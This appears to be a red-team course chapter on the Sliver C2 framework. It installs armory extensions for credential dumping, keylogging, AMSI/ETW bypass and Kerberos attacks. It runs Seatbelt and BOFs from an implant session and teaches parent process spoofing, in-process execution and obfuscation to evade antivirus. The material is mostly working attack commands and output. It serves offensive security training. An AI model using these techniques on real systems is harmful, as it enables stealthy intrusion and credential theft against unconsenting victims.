# Assemblies and Bofs

The Sliver armory is used to install and maintain third party extensions and aliases within sliver. The full list of available extensions can be found at https://github.com/sliverarmory/armory, keep in mind this is community maintained so not all modules are necessarily up to date. 

Pull requests are always welcome ! 

You can download all configured extensions/aliases using the armory command.

```bash
[server] sliver > armory install all

? Install 18 aliases and 84 extensions? Yes
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'SharpChrome' (v0.0.1) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!
[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!
[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
[*] Installing alias 'SharpUp' (v0.0.1) ... done!
[*] Installing alias 'SharpView' (v0.0.1) ... done!
[*] Installing alias 'SharPersist' (v0.0.1) ... done!
[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
[*] Installing alias 'Seatbelt' (v0.0.3) ... done!
[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
[*] Installing alias 'Sharp SMBExec' (v0.0.3) ... done!
[*] Installing alias 'NoPowerShell' (v0.0.1) ... done!
[*] Installing alias 'Rubeus' (v0.0.21) ... done!
[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
[*] Installing alias 'Certify' (v0.0.2) ... done!
[*] Installing alias 'sqlrecon' (v0.0.1) ... done!
[*] Installing extension 'remote-sc-create' (v0.0.4) ... done!
[*] Installing extension 'c2tc-winver' (v0.0.4) ... done!
[*] Installing extension 'bof-servicemove' (v0.0.1) ... done!
[*] Installing extension 'c2tc-smbinfo' (v0.0.4) ... done!
[*] Installing extension 'sa-ipconfig' (v0.0.19) ... done!
[*] Installing extension 'unhook-bof' (v0.0.2) ... done!
[*] Installing extension 'sa-adcs-enum-com' (v0.0.19) ... done!
[*] Installing extension 'sa-netview' (v0.0.19) ... done!
[*] Installing extension 'sa-tasklist' (v0.0.19) ... done!
[*] Installing extension 'sa-find-loaded-module' (v0.0.19) ... done!
[*] Installing extension 'delegationbof' (v0.0.2) ... done!
[*] Installing extension 'find-module' (v0.0.2) ... done!
[*] Installing extension 'sa-schtasksquery' (v0.0.19) ... done!
[*] Installing extension 'inject-etw-bypass' (v0.0.3) ... done!
[*] Installing extension 'sa-listdns' (v0.0.19) ... done!
[*] Installing extension 'sa-adcs-enum-com2' (v0.0.19) ... done!
[*] Installing extension 'sa-sc-query' (v0.0.19) ... done!
[*] Installing extension 'bof-roast' (v0.0.2) ... done!
[*] Installing extension 'handlekatz' (v0.0.1) ... done!
[*] Installing extension 'coff-loader' (v1.0.14) ... done!
[*] Installing extension 'sa-ldapsearch' (v0.0.19) ... done!
[*] Installing extension 'sa-enum-filter-driver' (v0.0.19) ... done!
[*] Installing extension 'remote-schtasks-delete' (v0.0.4) ... done!
[*] Installing extension 'find-proc-handle' (v0.0.2) ... done!
[*] Installing extension 'sa-uptime' (v0.0.19) ... done!
[*] Installing extension 'sa-sc-qfailure' (v0.0.19) ... done!
[*] Installing extension 'sa-windowlist' (v0.0.19) ... done!
[*] Installing extension 'syscalls_shinject' (v0.0.1) ... done!
[*] Installing extension 'nanodump' (v0.0.5) ... done!
[*] Installing extension 'inline-execute-assembly' (v0.0.1) ... done!
[*] Installing extension 'tgtdelegation' (v0.0.4) ... done!
[*] Installing extension 'sa-vssenum' (v0.0.19) ... done!
[*] Installing extension 'c2tc-kerberoast' (v0.0.4) ... done!
[*] Installing extension 'azbelt' (0.3.2) ... done!
[*] Installing extension 'hollow' (v0.0.1) ... done!
[*] Installing extension 'remote-sc-config' (v0.0.4) ... done!
[*] Installing extension 'sa-netstat' (v0.0.19) ... done!
[*] Installing extension 'c2tc-petitpotam' (v0.0.4) ... done!
[*] Installing extension 'sa-adv-audit-policies' (v0.0.19) ... done!
[*] Installing extension 'sa-schtasksenum' (v0.0.19) ... done!
[*] Installing extension 'remote-sc-start' (v0.0.4) ... done!
[*] Installing extension 'sa-cacls' (v0.0.19) ... done!
[*] Installing extension 'remote-process-list-handles' (v0.0.4) ... done!
[*] Installing extension 'sa-whoami' (v0.0.19) ... done!
[*] Installing extension 'sa-reg-query' (v0.0.19) ... done!
[*] Installing extension 'remote-sc-description' (v0.0.4) ... done!
[*] Installing extension 'sa-get-password-policy' (v0.0.19) ... done!
[*] Installing extension 'sa-sc-qc' (v0.0.19) ... done!
[*] Installing extension 'remote-process-destroy' (v0.0.4) ... done!
[*] Installing extension 'remote-adcs-request' (v0.0.4) ... done!
[*] Installing extension 'credman' (v1.0.7) ... done!
[*] Installing extension 'sa-driversigs' (v0.0.19) ... done!
[*] Installing extension 'sa-netshares' (v0.0.19) ... done!
[*] Installing extension 'remote-schtasks-stop' (v0.0.4) ... done!
[*] Installing extension 'c2tc-psw' (v0.0.4) ... done!
[*] Installing extension 'sa-nslookup' (v0.0.19) ... done!
[*] Installing extension 'sa-listmods' (v0.0.19) ... done!
[*] Installing extension 'sa-sc-qdescription' (v0.0.19) ... done!
[*] Installing extension 'ldapsigncheck' (v0.0.1) ... done!
[*] Installing extension 'c2tc-lapsdump' (v0.0.4) ... done!
[*] Installing extension 'c2tc-askcreds' (v0.0.4) ... done!
[*] Installing extension 'sa-wmi-query' (v0.0.19) ... done!
[*] Installing extension 'remote-setuserpass' (v0.0.4) ... done!
[*] Installing extension 'sa-netlocalgroup' (v0.0.19) ... done!
[*] Installing extension 'c2tc-addmachineaccount' (v0.0.4) ... done!
[*] Installing extension 'sa-routeprint' (v0.0.19) ... done!
[*] Installing extension 'sa-sc-enum' (v0.0.19) ... done!
[*] Installing extension 'remote-sc-stop' (v0.0.4) ... done!
[*] Installing extension 'sa-sc-qtriggerinfo' (v0.0.19) ... done!
[*] Installing extension 'remote-chrome-key' (v0.0.4) ... done!
[*] Installing extension 'sa-adcs-enum' (v0.0.19) ... done!
[*] Installing extension 'raw-keylogger' (0.0.1) ... done!
[*] Installing extension 'remote-reg-save' (v0.0.4) ... done!
[*] Installing extension 'chromiumkeydump' (v0.0.2) ... done!
[*] Installing extension 'secinject' (v0.0.1) ... done!
[*] Installing extension 'remote-enable-user' (v0.0.4) ... done!
[*] Installing extension 'sa-netgroup' (v0.0.19) ... done!
[*] Installing extension 'sa-arp' (v0.0.19) ... done!
[*] Installing extension 'inject-amsi-bypass' (v0.0.2) ... done!
[*] Installing extension 'remote-sc-delete' (v0.0.4) ... done!
[*] Installing extension 'sa-enum-local-sessions' (v0.0.19) ... done!
[*] Installing extension 'scshell' (v0.0.1) ... done!
[*] Installing extension 'remote-reg-delete' (v0.0.4) ... done!
[*] Installing extension 'sa-get-netsession' (v0.0.19) ... done!

[*] All packages installed
```

These commands can then be used in the context of a session or beacon similarly to other commands, with a couple caveats.

Let’s go ahead and run our first assembly.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt " WindowsCredentialFiles"

[*] seatbelt output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.1.1         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

====== WindowsCredentialFiles ======

  Folder : C:\Users\defaultuser0\AppData\Local\Microsoft\Credentials\

   ...
```

As you can see Sliver ran the Seatbelt assembly and provided us with the output of our command. Let’s investigate how exactly that happened.

The first thing we can notice is a new process spinning up when we run our command.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ae07f231-691e-4933-883f-fa368d0f78e6/Untitled.png)

Taking a closer look, that process is a child of our implant `UNABLE_PRIDE.exe`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2dfe565c-6429-4b74-a916-5a920f0ca85e/Untitled.png)

If you look at the assemblies loaded in that process, you’ll notice that the .NET clr along with the Seatbelt code are loaded into memory.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a92e524b-dda2-4b41-8254-3fc47e2ed025/Untitled.png)

All of this information indicates this process was used to run a post-exploitation module and will by default get caught by most AV’s. 

A more stealthy approach would be to change the default process to something more realistic and use parent process spoofing in order to mask our activity such as in the example below.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt -P 2968 -p "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" " WindowsCredentialFiles"
```

In this case we spoof our parent process id to `2968`, a Chrome process that has other similar child processes and set the default program to be `chrome.exe`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/93ee0728-be82-4fbb-8084-47f2bd336ece/Untitled.png)

This already looks a lot better and is more likely to bypass detections. A further improvement could be to identify processes that already load the .net CLR and use those to host our post-exploitation payloads or doing additional obfuscation of our extensions to avoid static detections such as `Seatbelt`,However this is somewhat beyond the scope of this course.

Another way to avoid detection is by running the assembly in process using the `-i` flag, while that avoids spinning up a new process, if the extension crashes for whatever reason you will loose your implant.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt -i " WindowsCredentialFiles"
...
```

If we take a look at the process hosting seatbelt, we’ll see its our implant process which will contain the .NET assembly references.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/37729326-f18b-4250-a873-d4bf4e54b7d5/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1c05c2f-f2b7-4784-a23b-a837f456cb45/Untitled.png)

## Bof’s

Beacon object files are loaded using trustedsec’s coffloader, when you run a bof command the loader will first be loaded into memory and is used to run whichever bof you choose. From an operator’s perspective bof’s are similar to basic sliver commands.

```bash
[server] sliver (UNABLE_PRIDE) > sa-whoami

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName		SID
====================== ====================================
test.local\tester

GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
test.local\None                              Group                    S-1-5-21-3109228153-3872411817-1195593578-513 Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114
BUILTIN\Administrators                            Alias                    S-1-5-32-544
BUILTIN\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,

Privilege Name                Description                                       State
============================= ================================================= ===========================
SeShutdownPrivilege           Shut down the system                              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeUndockPrivilege             Remove computer from docking station              Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
SeTimeZonePrivilege           Change the time zone                              Disabled
```

Since these payloads are run in-process, they have similar advantages and drawbacks as in-process assemblies meaning no new processes are spawned on execution, but a crash risks loosing the implant.

As an exercise, take some time to try out some of the available commands like `sa-ipconfig`, `nanodump` or `sa-ldapsearch`.

## References

https://github.com/sliverarmory/armory

[https://github.com/BishopFox/sliver/wiki/BOF-&-COFF-Support](https://github.com/BishopFox/sliver/wiki/BOF-&-COFF-Support)

[https://github.com/BishopFox/sliver/wiki/Aliases-&-Extensions](https://github.com/BishopFox/sliver/wiki/Aliases-&-Extensions)

[https://github.com/sliverarmory/COFFLoader](https://github.com/sliverarmory/COFFLoader)
